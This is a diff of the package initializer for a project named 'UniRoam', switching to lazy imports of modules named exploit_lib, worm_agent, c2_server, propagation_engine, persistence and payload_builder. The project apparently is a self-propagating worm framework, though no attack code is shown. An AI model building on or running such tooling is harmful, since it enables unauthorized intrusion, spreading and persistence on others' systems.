@@ -11,15 +11,9 @@ __version__ = "1.0.0"
 __author__ = "UniRoam Development Team"
 __license__ = "CC BY-NC-SA 4.0"
 
-# Core modules
-from . import config
-from . import exploit_lib
-from . import worm_agent
-from . import c2_server
-from . import propagation_engine
-from . import persistence
-from . import payload_builder
-from . import opsec_utils
+# Core modules - using lazy imports to avoid Windows asyncio issues
+# when running as subprocess with redirected I/O
+from . import config  # config is safe to import
 
 __all__ = [
     'config',
@@ -31,4 +25,14 @@ __all__ = [
     'payload_builder',
     'opsec_utils',
 ]
+
+# Lazy import helper
+def __getattr__(name):
+    """Lazy import modules to avoid Windows asyncio subprocess issues"""
+    if name in __all__:
+        import importlib
+        module = importlib.import_module(f'.{name}', __package__)
+        globals()[name] = module
+        return module
+    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")
 
